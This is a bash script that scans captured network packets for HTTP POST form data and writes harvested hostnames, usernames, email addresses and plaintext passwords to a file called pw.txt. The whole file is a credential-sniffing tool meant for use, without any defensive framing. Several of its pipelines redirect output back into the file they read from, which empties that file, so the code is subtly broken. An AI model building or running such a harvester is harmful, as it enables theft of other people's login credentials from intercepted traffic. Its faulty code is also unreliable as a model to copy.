#!/bin/bash

# displays plaintext passwords

function is_in() {
    if [[ `echo "$1" | grep -i "$2"` != "" ]]; then
      echo $1
      echo $1 >> $outp
    fi
}

file="temp"     # file to read packets from
outp="pw.txt"   # file to save passwords to
raw="out"       # temporary file

# if the output file exists...
if [ -f $file ]; then
  
  # count number of lines containing &pass and 5Bpass
  # these are common POSTDATA strings for passwords
  num=$(cat $file | grep -a -i -c "&pass\|5Bpass")
  
  # if we found pass in the file
  if [ ! "$num" -eq "0" ]; then
    # let the user know
    echo ${num} password\(s\) found. Saved to \"${outp}\"...
    
    # extract pass and the 20 lines above it.
    #    then, extract the host 
    #    so we know what site the password goes to
    # finally, remove excess characters that get in the way
    
    cat $file | grep -a -i -B 20 "pass\|pwd" > $raw
    cat $raw | grep -a -i -e 'pass' -e 'pwd' -e 'Host\: ' > $raw
    cat $raw | sed 's/[^a-zA-Z0-9&$@?!.,-:;#%*+=]//g' > $raw
    
    # the file $raw now has the lines of data, i.e.:
    # Host: www.site.com
    # POSTDATA - i.e. &loginforminfo=asdf&user=derp&pass=hurrdurr&this=that&blah=blah
    
    site=" "
    
    # go through every line of the $raw file
    cat $raw | while read line; do
      # each line is "$line"
      
      # if the phrase pass is NOT found on this line
      if [[ `echo "$line" | grep -i -e "pass" -e "pwd"` == "" ]]; then
        # this line does not contain the password
        # ...must be the host
        
        # print the host without excess
        line=$(echo "$line" | sed 's/Host\://g')
        line=$(echo "$line" | sed 's/http\:\/\///g')
        
        site=$line
        # echo "$line"
        # echo "$line" >> $outp
      elif [[ ! ${line:0:7} == "Cookie:" ]]; then
        # pass IS found on this line
        
        # print the site
        echo "$site"
        echo "$site" >> $outp
        
        # remove non-printable characters
        line=$(echo $line | tr -dc '[:print:]')
        
        # split by & delimiters into array
        arr=$(echo $line | tr "&" "\n")
        
        # loop through each item in the array
        for x in $arr
        do
          # the function is_in is at the top of this script
          # if first argument contains second argument, 
          #    first argument is printed
          is_in "$x" "user"
          is_in "$x" "name"
          is_in "$x" "mail"
          is_in "$x" "pass"
          is_in "$x" "pwd"
          
        done
        # separate the lines
        echo "----"
        echo "----" >> $outp
      fi
    done
    
    # remove raw file
    rm $raw
    
    # don't leave the user hanging
    echo Waiting for more packets...
  fi
  
fi

exit 0